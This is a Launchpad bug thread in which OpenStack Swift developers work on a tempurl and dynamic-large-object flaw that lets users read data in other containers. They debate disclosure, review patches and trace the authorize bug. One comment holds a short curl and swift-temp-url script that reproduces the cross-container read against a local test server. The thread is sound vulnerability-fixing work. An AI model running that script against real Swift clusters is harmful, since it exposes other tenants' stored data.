Correct me if I'm wrong, but the underlying issue seems identical (lack of check for temp url), and thus we better issue a single advisory (that could cover two bugs reports and different patch sets).
Some questions:
Comment #31 suggests the exploit needs more than one temp url. Is this for the account temp url issue ?
The current proposed fix in comment #25 only fix the container temp url and does not require a backport right ?
So what we are missing here to move forward is a fix for account temp url to be backported up to icehouse.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-05-11: |  |  | [#39](/swift/%2Bbug/1449212/comments/39) |
| --- | --- | --- | --- |

Tristan: Thanks, I'm still similarly confused. Samuel's commit message on the attachment in comment #25 and reply in comment #29 indicate that account tempurls are not vulnerable, but Clay's and Richard's subsequent replies seem to contradict that.

Tristan: Thanks, I'm still similarly confused. Samuel's commit message on the attachment in comment #25 and reply in comment #29 indicate that account tempurls are not vulnerable, but Clay's and Richard's subsequent replies seem to contradict that.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-05-11: |  |  | [#40](/swift/%2Bbug/1449212/comments/40) |
| --- | --- | --- | --- |

Jeremy and Tristan,

As Richard has pointed out the we definitely need to backport a fix for PUT tempurls (which we don't yet have, but probably looks a lot like "break all clients who are trying to create DLO's via PUT tempurl").

I opened lp [bug #1453948](/bugs/1453948)

-Clay

Jeremy and Tristan,
As Richard has pointed out the we definitely need to backport a fix for PUT tempurls (which we don't yet have, but probably looks a lot like "break all clients who are trying to create DLO's via PUT tempurl").
I opened lp bug #1453948
-Clay

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-06-01: |  |  | [#41](/swift/%2Bbug/1449212/comments/41) |
| --- | --- | --- | --- |

Sam,

I think I've spotted a bug in your func tests.. but am about to step into a meeting. Once out I'll just double check to make sure and then post a follow up patch.

Sam,
I think I've spotted a bug in your func tests.. but am about to step into a meeting. Once out I'll just double check to make sure and then post a follow up patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-06-01: |  |  | [#42](/swift/%2Bbug/1449212/comments/42) |
| --- | --- | --- | --- |

* [Sam's patch with a fixed func test.](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4407820/%2Bfiles/tempurl_fix.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4407820)
  (82.7 KiB,
  text/plain)

Here is an updated version of Sam's patch, except with the test\_GET\_DLO\_outside\_container test fixed so the manifest is in container2 and points to the segments in container.

+ seg1 = self.env.container.file(

  + "get-dlo-outside-seg1" + Utils.create\_name())

  + seg2 = self.env.container.file(

  + "get-dlo-outside-seg2" + Utils.create\_name())

  + seg1.write("one fish two fish ")

  + seg2.write("red fish blue fish")

  +

  + container2 = self.env.account.container(Utils.create\_name())

  +

  + manifest = container2.file("manifest" + Utils.create\_name())

  + manifest.write(

  + '',

  + hdrs={"X-Object-Manifest": "%s/get-dlo-outside-seg" %

  + (self.env.container.name,)})

Here is an updated version of Sam's patch, except with the test\_GET\_DLO\_outside\_container test fixed so the manifest is in container2 and points to the segments in container.
+ seg1 = self.env.container.file(
+ "get-dlo-outside-seg1" + Utils.create\_name())
+ seg2 = self.env.container.file(
+ "get-dlo-outside-seg2" + Utils.create\_name())
+ seg1.write("one fish two fish ")
+ seg2.write("red fish blue fish")
+
+ container2 = self.env.account.container(Utils.create\_name())
+
+ manifest = container2.file("manifest" + Utils.create\_name())
+ manifest.write(
+ '',
+ hdrs={"X-Object-Manifest": "%s/get-dlo-outside-seg" %
+ (self.env.container.name,)})

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-10: |  |  | [#43](/swift/%2Bbug/1449212/comments/43) |
| --- | --- | --- | --- |

So what is the current proposed fix for this bug ?

Is the impact description proposed in comment #31 correct ?

Is there a plan for [bug 1453948](/bugs/1453948) ? Or will it be only fixed in master ?

So what is the current proposed fix for this bug ?
Is the impact description proposed in comment #31 correct ?
Is there a plan for bug 1453948 ? Or will it be only fixed in master ?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-06-12: |  |  | [#44](/swift/%2Bbug/1449212/comments/44) |
| --- | --- | --- | --- |

@Tristan: Sams patch #25 with the change from Matthew in #42 looks good to me.

The impact description in comment #31 is correct, however the last but one paragraph is identical with [bug 1453948](/bugs/1453948) (and might be removed if two separate OSSAs are going to be published).

@Tristan: Sams patch #25 with the change from Matthew in #42 looks good to me.
The impact description in comment #31 is correct, however the last but one paragraph is identical with bug 1453948 (and might be removed if two separate OSSAs are going to be published).

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-06-12: |  |  | [#45](/swift/%2Bbug/1449212/comments/45) |
| --- | --- | --- | --- |

The impact description in comment #31 is far, far too much detail. We need something around the brevity of my impact description in comment #26 to disambiguate this report from any similar bugs which might be reported within the same calendar year, and to act as a general signal to less technically savvy downstream consumers sufficiently answering the question "do I need to apply this patch on my systems?" Additional technical detail can be summarized within the bug if necessary.

The impact description in comment #31 is far, far too much detail. We need something around the brevity of my impact description in comment #26 to disambiguate this report from any similar bugs which might be reported within the same calendar year, and to act as a general signal to less technically savvy downstream consumers sufficiently answering the question "do I need to apply this patch on my systems?" Additional technical detail can be summarized within the bug if necessary.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-06-12: |  |  | [#46](/swift/%2Bbug/1449212/comments/46) |
| --- | --- | --- | --- |

Oh, I think I'm misreading comment #31 as implying that the paragraphs after the ---- should be part of the impact description. Sorry, the part above the ---- looks like a fine impact description to me too.

Oh, I think I'm misreading comment #31 as implying that the paragraphs after the ---- should be part of the impact description. Sorry, the part above the ---- looks like a fine impact description to me too.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#47](/swift/%2Bbug/1449212/comments/47) |
| --- | --- | --- | --- |

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1449212](https://bugs.launchpad.net/swift/%2Bbug/1449212) are closely related and should only be disclosed at the same time.

Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1449212 are closely related and should only be disclosed at the same time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [John Dickinson (notmyname)](https://launchpad.net/~notmyname) wrote on 2015-06-12: |  |  | [#48](/swift/%2Bbug/1449212/comments/48) |
| --- | --- | --- | --- |

bad paste, sorry.

Tristan, this bug and [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) are closely related and should only be disclosed at the same time.

bad paste, sorry.
Tristan, this bug and https://bugs.launchpad.net/swift/+bug/1453948 are closely related and should only be disclosed at the same time.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-23: |  |  | [#49](/swift/%2Bbug/1449212/comments/49) |
| --- | --- | --- | --- |

I tried to rebase this on top of the fix I attached to lp [bug #1453948](/bugs/1453948) - but it looks like a couple of new tests assume it's safe to create DLO's via PUT tempurls (and then it validates you can't download them)

======================================================================

    ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurl)

    ----------------------------------------------------------------------

    Traceback (most recent call last):

      File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container

        (self.env.container.name,)})

      File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write

        self.conn.make\_path(self.path))

    ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/83790b246ebe49adb3240a9443a15789/manifestd6f808a66f82410aa73646327e8e9353') txid=tx91a6ef5b1001417eae414-005588c7ce

======================================================================

    ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurlUTF8)

    ----------------------------------------------------------------------

    Traceback (most recent call last):

      File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container

        (self.env.container.name,)})

      File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write

        self.conn.make\_path(self.path))

    ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/%E1%A0%83%E8%94%89%ED%88%8E%ED%88%8F%E3%9C%85%E8%94%8A%EF%84%91%E1%A0%82%E0%A4%82%E9%90%8B%E0%A4%81%E1%A0%81%E8%94%88%EF%84%8F%E8%94%88/manifest%EB%8C%8E%E0%A4%81%E5%98%88%E8%94%88%EB%8C%8C%E5%98%85%E5%98%88%E9%90%8C%E0%A4%82%EF%84%92%E5%98%85%EF%84%92%E1%A0%83%EF%84%90%E8%94%89') txid=tx3971d8beddea439badad0-005588c7cf

I tried to rebase this on top of the fix I attached to lp bug #1453948 - but it looks like a couple of new tests assume it's safe to create DLO's via PUT tempurls (and then it validates you can't download them)
======================================================================
ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurl)
----------------------------------------------------------------------
Traceback (most recent call last):
File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container
(self.env.container.name,)})
File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write
self.conn.make\_path(self.path))
ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/83790b246ebe49adb3240a9443a15789/manifestd6f808a66f82410aa73646327e8e9353') txid=tx91a6ef5b1001417eae414-005588c7ce
======================================================================
ERROR: test\_GET\_DLO\_outside\_container (test.functional.tests.TestTempurlUTF8)
----------------------------------------------------------------------
Traceback (most recent call last):
File "/vagrant/swift/test/functional/tests.py", line 2907, in test\_GET\_DLO\_outside\_container
(self.env.container.name,)})
File "/vagrant/swift/test/functional/swift\_test\_client.py", line 952, in write
self.conn.make\_path(self.path))
ResponseError: 404: 'Not Found' ('PUT' '/v1/AUTH\_test/%E1%A0%83%E8%94%89%ED%88%8E%ED%88%8F%E3%9C%85%E8%94%8A%EF%84%91%E1%A0%82%E0%A4%82%E9%90%8B%E0%A4%81%E1%A0%81%E8%94%88%EF%84%8F%E8%94%88/manifest%EB%8C%8E%E0%A4%81%E5%98%88%E8%94%88%EB%8C%8C%E5%98%85%E5%98%88%E9%90%8C%E0%A4%82%EF%84%92%E5%98%85%EF%84%92%E1%A0%83%EF%84%90%E8%94%89') txid=tx3971d8beddea439badad0-005588c7cf

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-29: |  |  | [#50](/swift/%2Bbug/1449212/comments/50) |
| --- | --- | --- | --- |

Adding ossg-coresec to both bugs in order to discuss if these bugs should be kept private.

Adding ossg-coresec to both bugs in order to discuss if these bugs should be kept private.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-06-29: |  |  | [#51](/swift/%2Bbug/1449212/comments/51) |
| --- | --- | --- | --- |

Why wouldn't they be kept private?

Can I get some feedback on the patch attached to lp [bug #1453948](/bugs/1453948)

If that looks good I can work on the rebase of sam & matts patch here over that - plus backports all around.

I think we should nail down the other fix first tho since it backports further.

Why wouldn't they be kept private?
Can I get some feedback on the patch attached to lp bug #1453948
If that looks good I can work on the rebase of sam & matts patch here over that - plus backports all around.
I think we should nail down the other fix first tho since it backports further.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Tristan Cacqueray (tristan-cacqueray)](https://launchpad.net/~tristan-cacqueray) wrote on 2015-06-29: |  |  | [#52](/swift/%2Bbug/1449212/comments/52) |
| --- | --- | --- | --- |

Clay, having these bugs public would in theory get more reviewer on-board and a faster process (gerrit and gate testing).

It have been two months already and the exploitation of these issues seem to require a fair amount of social engineering, so unless there is something we missed, the impact is rather moderate.

Clay, having these bugs public would in theory get more reviewer on-board and a faster process (gerrit and gate testing).
It have been two months already and the exploitation of these issues seem to require a fair amount of social engineering, so unless there is something we missed, the impact is rather moderate.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Robert Clark (robert-clark)](https://launchpad.net/~robert-clark) wrote on 2015-07-06: |  |  | [#53](/swift/%2Bbug/1449212/comments/53) |
| --- | --- | --- | --- |

Although moving slowly, the issue clearly has the attention of developers from Swift. I'm not convinced that opening this up would progress the issue any faster but it may put existing deployments at risk.

To that end, I suggest this remains closed.

@Swift Developers - what, if anything, can we (Security or VMT) do to help progress this?

Although moving slowly, the issue clearly has the attention of developers from Swift. I'm not convinced that opening this up would progress the issue any faster but it may put existing deployments at risk.
To that end, I suggest this remains closed.
@Swift Developers - what, if anything, can we (Security or VMT) do to help progress this?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-07-06: |  |  | [#54](/swift/%2Bbug/1449212/comments/54) |
| --- | --- | --- | --- |

I was more looking for feedback from vmt-coresec on whether this bug describes a viable, real-world exploit based on typical use cases, or whether it's a corner case relying on unusual trust boundaries and social engineering to achieve any actual compromise.

I'm mostly just trying to gauge relative severity since we're trying, within the VMT, to start pushing lower-severity vulnerability reports into the open. Keeping vulnerabilities under embargo for long periods of time is harmful both in terms of the amount of effort expended by parties involved (compared to availability of more efficient public-facing workflows), but also insofar as users of features impacted by this vulnerability don't currently know they should avoid doing so. The default stance of "keep every security vulnerability secret until it's fixed no matter how trivial" is a bad habit of which we're attempting to break ourselves going forward.

I was more looking for feedback from vmt-coresec on whether this bug describes a viable, real-world exploit based on typical use cases, or whether it's a corner case relying on unusual trust boundaries and social engineering to achieve any actual compromise.
I'm mostly just trying to gauge relative severity since we're trying, within the VMT, to start pushing lower-severity vulnerability reports into the open. Keeping vulnerabilities under embargo for long periods of time is harmful both in terms of the amount of effort expended by parties involved (compared to availability of more efficient public-facing workflows), but also insofar as users of features impacted by this vulnerability don't currently know they should avoid doing so. The default stance of "keep every security vulnerability secret until it's fixed no matter how trivial" is a bad habit of which we're attempting to break ourselves going forward.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Jeremy Stanley (fungi)](https://launchpad.net/~fungi) wrote on 2015-07-06: |  |  | [#55](/swift/%2Bbug/1449212/comments/55) |
| --- | --- | --- | --- |

Sorry, I meant "ossg-coresec" where I said "vmt-coresec" there.

Sorry, I meant "ossg-coresec" where I said "vmt-coresec" there.

[John Dickinson (notmyname)](https://launchpad.net/~notmyname)
on 2015-07-29

| Changed in swift: | |
| --- | --- |
| **importance**: | Undecided → Critical |

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-04: |  |  | [#56](/swift/%2Bbug/1449212/comments/56) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438741/%2Bfiles/disable-get-container-tempurl-cross-container.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438741)
  (91.4 KiB,
  text/plain)

So I'm still not entirely happy with all the get\_\*\_info changes needed to support this fix, but only because I think test test cleanup distracts from the important change of fixing the authorize callback. I definitely approve of this improvement to the environ caching, and I think i'll be much easier on us down the road - so maybe now is as good a time to fix it as any.

To reiterate the other dirty hacks that I've suggested (as opposed to using sam's \*fix\*) were:

a) make the tempurl callback return 401 until container acls are in place - coupling with existing behavior to indirectly prevent the authorize callback pop

b) hijack the `swift.authorize\_override` environ boolean to \*also\* indicate that it's cheap to call authorize and update the base controller to not pop the authorize callback from preauthorized requests' environ.

c) start to fix environ caching to not rely on the proxy server setting the cache in the get\_\*\_info() request environ, and instead use the response directly \*

\* N.B. I think using the get\_\*\_info() response directly (instead of it's requests' environ) to fill in the original requests env cache is actually the correct fix - but when I started down this road the test fall out was about the same as the info\_cache trick (it was starting to look a little worse actually). I found a hack that starts down the path without fully commiting to removing the request environ caching junk that I thought was ok. I'll attach that one separately.

So I'm still not entirely happy with all the get\_\*\_info changes needed to support this fix, but only because I think test test cleanup distracts from the important change of fixing the authorize callback. I definitely approve of this improvement to the environ caching, and I think i'll be much easier on us down the road - so maybe now is as good a time to fix it as any.
To reiterate the other dirty hacks that I've suggested (as opposed to using sam's \*fix\*) were:
a) make the tempurl callback return 401 until container acls are in place - coupling with existing behavior to indirectly prevent the authorize callback pop
b) hijack the `swift.authorize\_override` environ boolean to \*also\* indicate that it's cheap to call authorize and update the base controller to not pop the authorize callback from preauthorized requests' environ.
c) start to fix environ caching to not rely on the proxy server setting the cache in the get\_\*\_info() request environ, and instead use the response directly \*
\* N.B. I think using the get\_\*\_info() response directly (instead of it's requests' environ) to fill in the original requests env cache is actually the correct fix - but when I started down this road the test fall out was about the same as the info\_cache trick (it was starting to look a little worse actually). I found a hack that starts down the path without fully commiting to removing the request environ caching junk that I thought was ok. I'll attach that one separately.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [clayg (clay-gerrard)](https://launchpad.net/~clay-gerrard) wrote on 2015-08-04: |  |  | [#57](/swift/%2Bbug/1449212/comments/57) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container-2.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4438746/%2Bfiles/disable-get-container-tempurl-cross-container-2.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4438746)
  (31.5 KiB,
  text/plain)

This one should be a little shorter, it's the cleanest hack I could come up with - but honestly the smallest possible diff may be a misguided goal since we're not going to need backport this beyond Kilo.

This one should be a little shorter, it's the cleanest hack I could come up with - but honestly the smallest possible diff may be a misguided goal since we're not going to need backport this beyond Kilo.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#58](/swift/%2Bbug/1449212/comments/58) |
| --- | --- | --- | --- |

Clay, I can't apply your patches to master, is there a commit ID I can checkout to apply these patches to for testing?

It looks good as a patch in theory but want to play around with it. So this should make the 'swift.authorize' when run in the proxy to give us a 401 when trying to access if a different container/account right? We seem to wrap the GET and PUT methods of 'swift/proxy/controllers/obj.py with delay\_denial, which looking at the proxy code means it's actually ignoring the result, am I missing something.. you have tests that prove this is not the case.. maybe I'm just confused and maybe my brain isn't as 100% as I thought post Flu.

But testing will simply check this :)

I'm continuing my playing, just wanted to update the bug with my 2 cents.

Clay, I can't apply your patches to master, is there a commit ID I can checkout to apply these patches to for testing?
It looks good as a patch in theory but want to play around with it. So this should make the 'swift.authorize' when run in the proxy to give us a 401 when trying to access if a different container/account right? We seem to wrap the GET and PUT methods of 'swift/proxy/controllers/obj.py with delay\_denial, which looking at the proxy code means it's actually ignoring the result, am I missing something.. you have tests that prove this is not the case.. maybe I'm just confused and maybe my brain isn't as 100% as I thought post Flu.
But testing will simply check this :)
I'm continuing my playing, just wanted to update the bug with my 2 cents.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#59](/swift/%2Bbug/1449212/comments/59) |
| --- | --- | --- | --- |

Lol, ignore that, swift.autherize stuff, I just fail at reading/grepping.. (AKA I'm an idiot). Turns out when doing a search inside of vim, use the US spelling of authorize (not authorise) inside the proxy controllers.

Lol, ignore that, swift.autherize stuff, I just fail at reading/grepping.. (AKA I'm an idiot). Turns out when doing a search inside of vim, use the US spelling of authorize (not authorise) inside the proxy controllers.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#60](/swift/%2Bbug/1449212/comments/60) |
| --- | --- | --- | --- |

* [disable-get-container-tempurl-cross-container-3.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439609/%2Bfiles/disable-get-container-tempurl-cross-container-3.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439609)
  (31.3 KiB,
  text/plain)

Attached is a rebased version of Clays patch. Applies without a warning on current master (commit 5b24b22).

Currently testing patch.

Attached is a rebased version of Clays patch. Applies without a warning on current master (commit 5b24b22).
Currently testing patch.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#61](/swift/%2Bbug/1449212/comments/61) |
| --- | --- | --- | --- |

Looks like the patch is still allowing to abuse DLO+container tempurl, for example using the following simple script:

echo 12345 > foo.txt

 swift upload victim-container foo.txt

 swift post -m "temp-url-key: secret" compromised-container

tempurl=`swift-temp-url PUT 60 /v1/AUTH\_test/compromised-container/foo.txt secret`

 curl -i -X PUT <http://127.0.0.1:8080>${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'

tempurl=`swift-temp-url GET 60 /v1/AUTH\_test/compromised-container/foo.txt secret`

 curl -i <http://127.0.0.1:8080>${tempurl}

Or did I get it wrong?

Looks like the patch is still allowing to abuse DLO+container tempurl, for example using the following simple script:
echo 12345 > foo.txt
swift upload victim-container foo.txt
swift post -m "temp-url-key: secret" compromised-container
tempurl=`swift-temp-url PUT 60 /v1/AUTH\_test/compromised-container/foo.txt secret`
curl -i -X PUT http://127.0.0.1:8080${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'
tempurl=`swift-temp-url GET 60 /v1/AUTH\_test/compromised-container/foo.txt secret`
curl -i http://127.0.0.1:8080${tempurl}
Or did I get it wrong?

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#62](/swift/%2Bbug/1449212/comments/62) |
| --- | --- | --- | --- |

Thanks for that Christian (rebase),

Hmm it looks like what your doing is right. The patch should be setting the swift.authorize to fail if accessing the other container, unless something else if overwriting swift.authorize later in the pipeline.

I'll have a play and see if it fails for me.

Thanks for that Christian (rebase),
Hmm it looks like what your doing is right. The patch should be setting the swift.authorize to fail if accessing the other container, unless something else if overwriting swift.authorize later in the pipeline.
I'll have a play and see if it fails for me.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#63](/swift/%2Bbug/1449212/comments/63) |
| --- | --- | --- | --- |

* [acoles-combined-tempurl-xlo-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439721/%2Bfiles/acoles-combined-tempurl-xlo-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439721)
  (31.8 KiB,
  text/plain)

Did you include the patch from here [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) #15?

I took Christian's patch at #60, manually merged [https://bugs.launchpad.net/swift/+bug/1453948](https://bugs.launchpad.net/swift/%2Bbug/1453948) #15 patch (would not apply) and then the scenario at #61 fails because

curl -i -X PUT <http://127.0.0.1:8080>${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'

is disallowed with 400

My combined diff wrt master is attached FYI

Did you include the patch from here https://bugs.launchpad.net/swift/+bug/1453948 #15?
I took Christian's patch at #60, manually merged https://bugs.launchpad.net/swift/+bug/1453948 #15 patch (would not apply) and then the scenario at #61 fails because
curl -i -X PUT http://127.0.0.1:8080${tempurl} -H 'X-Object-Manifest: victim-container/f' -H 'Content-Length: 0'
is disallowed with 400
My combined diff wrt master is attached FYI

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#64](/swift/%2Bbug/1449212/comments/64) |
| --- | --- | --- | --- |

I'm getting the same result as you Christian, interestingly the swift.authorze method isn't being overriden so that's good.. but the result is None, so the container check isn't returning a 401 like we suspect.

Here's some sanitised q() output:

handle\_request: id(req.environ['swift.authorize'])=140192181680680

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

  \_\_call\_\_: id(env['swift.authorize'])=140192234245248

  handle\_request: id(req.environ['swift.authorize'])=140192234245248

\_\_call\_\_: id(env['swift.authorize'])=140415816079552

  handle\_request: id(req.environ['swift.authorize'])=140415816079552

  handle\_request: resp=None

NOTE: The function ID stays the same, and the response to the swift.authorize is None

I'm going to look into it further.

I'm getting the same result as you Christian, interestingly the swift.authorze method isn't being overriden so that's good.. but the result is None, so the container check isn't returning a 401 like we suspect.
Here's some sanitised q() output:
handle\_request: id(req.environ['swift.authorize'])=140192181680680
handle\_request: id(req.environ['swift.authorize'])=140192234245248
handle\_request: id(req.environ['swift.authorize'])=140192234245248
\_\_call\_\_: id(env['swift.authorize'])=140192234245248
handle\_request: id(req.environ['swift.authorize'])=140192234245248
\_\_call\_\_: id(env['swift.authorize'])=140415816079552
handle\_request: id(req.environ['swift.authorize'])=140415816079552
handle\_request: resp=None
NOTE: The function ID stays the same, and the response to the swift.authorize is None
I'm going to look into it further.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Matthew Oliver (matt-0)](https://launchpad.net/~matt-0) wrote on 2015-08-05: |  |  | [#65](/swift/%2Bbug/1449212/comments/65) |
| --- | --- | --- | --- |

OK so it seems the swift.authorize method is only being called once, when a subrequest is issued there is no swift.authorize. In fact during debugging directly before <https://github.com/openstack/swift/blob/master/swift/common/middleware/dlo.py#L236> swift.authorize exists in the req object, directly afterwards it doesn't.

If I do something like:

swift\_authorize = req.environ.get('swift.authorize')

  resp\_iter = self.\_app\_call(req.environ)

  req.environ['swift.authorize'] = swift\_authorize

Then it's fixed.. that's as far as I've got, but its midnight here and I need to get up for the meeting early in the morning, so someone can take off from where I left it. By either seeing why its removed from 'self.\_app\_call()', butting my hack in, or placing it somewhere better.

Night.

OK so it seems the swift.authorize method is only being called once, when a subrequest is issued there is no swift.authorize. In fact during debugging directly before https://github.com/openstack/swift/blob/master/swift/common/middleware/dlo.py#L236 swift.authorize exists in the req object, directly afterwards it doesn't.
If I do something like:
swift\_authorize = req.environ.get('swift.authorize')
resp\_iter = self.\_app\_call(req.environ)
req.environ['swift.authorize'] = swift\_authorize
Then it's fixed.. that's as far as I've got, but its midnight here and I need to get up for the meeting early in the morning, so someone can take off from where I left it. By either seeing why its removed from 'self.\_app\_call()', butting my hack in, or placing it somewhere better.
Night.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Christian Schwede (cschwede)](https://launchpad.net/~cschwede) wrote on 2015-08-05: |  |  | [#66](/swift/%2Bbug/1449212/comments/66) |
| --- | --- | --- | --- |

* [test\_patch.sh](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439846/%2Bfiles/test_patch.sh)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439846)
  (827 bytes,
  text/x-sh)

@Alistair: yes, with that patch applied my test above doesn't work anymore, because putting a DLO with tempurl fails with "The header 'X-Object-Manifest' is not allowed in this tempurl".

However, any existing DLO is still able to read the data. As a user with write permission and knowledge of the container tempurl key I could simply create a new DLO, still reading data in other containers I don't have access to.

Proof of concept attached, succeeding on a clean SAIO environment with both patches applied.

@Alistair: yes, with that patch applied my test above doesn't work anymore, because putting a DLO with tempurl fails with "The header 'X-Object-Manifest' is not allowed in this tempurl".
However, any existing DLO is still able to read the data. As a user with write permission and knowledge of the container tempurl key I could simply create a new DLO, still reading data in other containers I don't have access to.
Proof of concept attached, succeeding on a clean SAIO environment with both patches applied.

Revision history for this message
![](/+icing/build/overlay/assets/skins/sam/images/close.gif)

| [Alistair Coles (alistair-coles)](https://launchpad.net/~alistair-coles) wrote on 2015-08-05: |  |  | [#67](/swift/%2Bbug/1449212/comments/67) |
| --- | --- | --- | --- |

* [acoles-tempurl-dlo-functest-mod.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439888/%2Bfiles/acoles-tempurl-dlo-functest-mod.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439888)
  (26.8 KiB,
  text/plain)

@Matt the proxy app removes swift.authorize from env line 398 swift/proxy/server.py:

- for a manifest get from a container tempurl, the first call to swift.authorize is for the manifest which \*is\* in the nontainer scope, so authorize\_same\_container returns None and the proxy removes swift.authorize from env. The subsequent requests to the other container (the segments container) are then not auth'd :(

There is a big in the functional test for this scenario (I think, its late and this is complicated for my small brain!), I will attach a patch which leaves the test test.functional.tests.TestContainerTempurl#test\_GET\_DLO\_outside\_container failing due to above I think.

Patch is against master and based on Christian's rebase onto master in #60 with a change to the func test to reveal a failure case.

@Matt the proxy app removes swift.authorize from env line 398 swift/proxy/server.py:
- for a manifest get from a container tempurl, the first call to swift.authorize is for the manifest which \*is\* in the nontainer scope, so authorize\_same\_container returns None and the proxy removes swift.authorize from env. The subsequent requests to the other container (the segments container) are then not auth'd :(
